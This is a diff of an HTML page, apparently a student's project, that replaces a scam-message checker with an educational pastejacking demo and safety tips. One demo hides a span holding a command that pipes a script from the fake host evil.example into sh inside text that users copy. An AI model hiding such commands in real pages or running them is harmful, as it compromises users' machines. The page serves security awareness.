@@ -1,38 +1,60 @@
 <!DOCTYPE html>
-<!-- index.html — page ka DHAANCHA (structure).
-     Design → style.css, dimaag (logic) → script.js -->
+<!-- index.html — STRUCTURE of the "Pastejacking Demo".
+     Look → style.css, logic → script.js -->
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- phone par sahi fit -->
-  <title>SandeshKavach – Scam Message Checker</title>
-  <meta name="description" content="SMS ya WhatsApp message paste karo, scam hai ya nahi turant jaano.">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pastejacking Demo – What You Copy Is Not What You Paste</title>
+  <meta name="description" content="A safe live demo of pastejacking: websites can secretly change what you copy. Learn how it works and how to protect yourself.">
   <link rel="icon" href="assets/logo-mark.svg">
   <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <main>
     <img src="assets/logo-mark.svg" alt="KP logo" width="56" height="56">
-    <h1>Sandesh<span>Kavach</span></h1>
-    <p class="sub">Message paste karo — scam hai ya nahi, 1 second me jaano.</p>
+    <h1>Paste<span>jacking</span></h1>
+    <p class="sub">What you copy is not always what you paste. Try it yourself: this is a safe demo, and nothing runs.</p>
 
-    <!-- user yahan message daalega -->
-    <textarea id="msg" rows="5" placeholder="Jaise: Aapka account aaj block ho jayega, turant OTP bhejein…"></textarea>
+    <!-- DEMO 1: copy event / copy button is hijacked -->
+    <section class="card">
+      <h2>Demo 1 · The hijacked copy button</h2>
+      <p>A "tutorial" website tells you to install a Python package. Copy the command (with the button, or select it and press Ctrl+C):</p>
+      <div class="code" id="code1">pip install requests</div>
+      <button id="copy1">📋 Copy command</button>
+    </section>
 
-    <div class="buttons">
-      <button id="check">🔍 Check karo</button>
-      <button id="sample" class="light">Sample message</button>
-    </div>
+    <!-- DEMO 2: hidden text inside the selection -->
+    <section class="card">
+      <h2>Demo 2 · The invisible text</h2>
+      <p>Select the whole line below with your mouse and copy it (Ctrl+C):</p>
+      <!-- the span is hidden with CSS, but it is still part of the selection -->
+      <div class="code" id="code2">git clone https://github.com/Kanak234/demo<span class="hidden"> && curl -s http://evil.example/steal.sh | sh # </span> && cd demo</div>
+    </section>
 
-    <!-- result yahan dikhega (script.js bharega) -->
-    <div id="result"></div>
+    <!-- PASTE AREA: shows the truth -->
+    <section class="card">
+      <h2>Now paste here (Ctrl+V) 👇</h2>
+      <textarea id="paste" rows="3" placeholder="Paste what you copied…"></textarea>
+      <div id="verdict"></div>
+    </section>
+
+    <section class="card">
+      <h2>How to stay safe</h2>
+      <ul>
+        <li><b>Never paste straight into a terminal.</b> Paste into Notepad first and read it.</li>
+        <li>Type short commands yourself instead of copying them.</li>
+        <li>Modern terminals warn about multi-line pastes. Keep that warning turned on.</li>
+        <li>Copy commands only from official documentation.</li>
+      </ul>
+    </section>
   </main>
 
   <footer>
     Made by <b>Kanak Prabhakar</b> · BCA (Cyber Security), AISECT University ·
-    Fraud hua? Call <b>1930</b> · 🔒 Message kahin bheja nahi jaata
+    Educational demo: evil.example is a reserved, fake domain, and nothing is executed.
   </footer>
 
-  <script src="script.js"></script> <!-- end me, taaki upar ka HTML pehle ban jaye -->
+  <script src="script.js"></script>
 </body>
 </html>
